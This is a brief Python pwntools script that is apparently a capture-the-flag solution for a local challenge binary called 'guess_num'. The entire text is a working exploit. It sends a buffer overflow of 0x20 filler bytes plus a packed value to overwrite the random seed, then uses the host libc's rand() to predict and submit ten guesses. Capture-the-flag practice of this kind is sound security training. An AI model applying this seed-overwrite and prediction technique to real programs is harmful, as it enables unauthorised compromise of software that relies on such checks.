from pwn import *
from ctypes import *

p = process("./guess_num")
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

pay = "A"*0x20 + p64(1)
p.sendlineafter("name:",pay)

libc.srand(1)

for i in range(10):
    p.sendlineafter("number:",str(libc.rand()%6 + 1))

print p.recv()
print p.recv()
